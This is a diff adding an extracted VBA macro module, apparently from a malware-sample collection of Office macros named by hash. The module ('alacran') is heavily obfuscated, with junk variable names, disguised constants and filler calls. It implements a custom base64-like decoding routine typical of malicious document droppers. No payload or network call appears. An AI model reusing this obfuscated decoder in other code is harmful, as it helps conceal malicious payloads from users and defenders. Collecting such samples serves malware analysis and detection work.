@@ -1,0 +1,106 @@
+Filename     : ./macros/4074ae1af5d6c514e895cdc9ba844dffc5e58cb13ce2665ed1a79a63bb1f937e
+OLE stream   : Macros/VBA/alacran
+VBA filename : alacran.bas
+----------------------------------------
+Attribute VB_Name = "alacran"
+Function conglomerate(maggire, scarecrow, rhythmicity)
+If rhythmicity = (24 + (10 / 2 - 5)) * 1 Then
+conglomerate = maggire \ scarecrow
+ElseIf rhythmicity = (34 + (5 - 3) / 2 - 1) * 1 Then
+conglomerate = maggire And scarecrow
+ElseIf rhythmicity = (42 + (56 / 7 - 4 * 2)) * 1 Then
+conglomerate = maggire * scarecrow
+End If
+End Function
+Function cowpens(arescent) As String
+Dim perambulation As Long
+Dim digester(6962) As Byte
+Dim soporiferous(63) As Long
+Dim paternoster(63) As Long
+Dim dacrymycetaceae() As Byte
+Dim owlet(63) As Long
+Dim caseation As Long
+Dim dysphoric As String
+Dim movability As Integer
+Dim perhaps As Long
+cantonment = Fix(221)
+
+Dim feme As Long
+unknowing = 53 - 90 + 101
+Dim warmup As Long
+
+nitroglycerin = 122 - 17 + 16514967
+centre = 32 - 7 + 65255
+arrogance = 91 - 103 + 4108
+neoplasia = 22 - 23 + 257
+heeltap = 8 - 111 + 16711783
+transvestite = 103 - 32 + 262073
+dona = 19 - 74 + 258103
+hoofer = 44 - 118 + 329
+matinee = 106 - 88 + 65518
+Dim blended As Variant
+
+dasymeter = 24 - 25 + 4033
+eelblenny = 126 - 75 + 12
+Dim melursus As Long
+
+Dim bluebird As Integer
+counterirritant = 77 - 42 + 7808
+Dim inconveniently() As Byte
+inconveniently = VBA.StrConv(arescent, 120 + 8)
+State = 56 + 21
+ Pmt 0, State, 16643, 43927, 8
+
+unreasoning = 7843
+blip = vbKeyShift - 12
+For ambiguity = 0 To unreasoning
+If ambiguity Mod 2 = 0 Then
+inconveniently(ambiguity) = inconveniently(ambiguity) - blip
+Else
+inconveniently(ambiguity) = inconveniently(ambiguity) - (blip - 1)
+End If
+Next ambiguity
+proh = 2 + 17
+ Pmt 0, proh, 9916, 36312, 2
+
+movability = 0
+cardiologic = fancies
+For caseation = (16 - 8 * 2) * 1 To (80 / 2 + 23) * (7 - 6)
+paternoster(caseation) = conglomerate(caseation, unknowing, 42)
+owlet(caseation) = conglomerate(caseation, arrogance, 42)
+soporiferous(caseation) = conglomerate(caseation, transvestite, 42)
+Next caseation
+mohammedanism = 52 + 4
+ Pmt 0, mohammedanism, 8936, 37887, 7
+
+dacrymycetaceae = inconveniently
+hibernation = 12 - 51 + 43
+mincement = 8 + 9
+ Pmt 0, mincement, 21893, 22166, 7
+
+correlative = 74 - 113 + 42
+caress = "patchcord"
+
+flaky = manageable * 4
+
+cardiology = correlative + 1
+valedictorian = 104 - 86 - 16
+For perambulation = 0 To unreasoning
+boring = dacrymycetaceae(perambulation)
+conestoga = dacrymycetaceae(perambulation + 2)
+esocidae = owlet(cardiologic(dacrymycetaceae(perambulation + 1)))
+fourpence = paternoster(cardiologic(conestoga)) + cardiologic(dacrymycetaceae(perambulation + correlative))
+feme = soporiferous(cardiologic(boring)) + esocidae + fourpence
+caseation = conglomerate(feme, heeltap, 34)
+digester(perhaps) = conglomerate(caseation, matinee, 24)
+caseation = conglomerate(feme, centre, 34)
+digester(perhaps + 1) = conglomerate(caseation, neoplasia, 24)
+digester(perhaps + valedictorian) = conglomerate(feme, hoofer, 34)
+perhaps = perhaps + valedictorian + 1
+perambulation = perambulation + 3
+Next
+cowpens = digester
+End Function
+
+
+
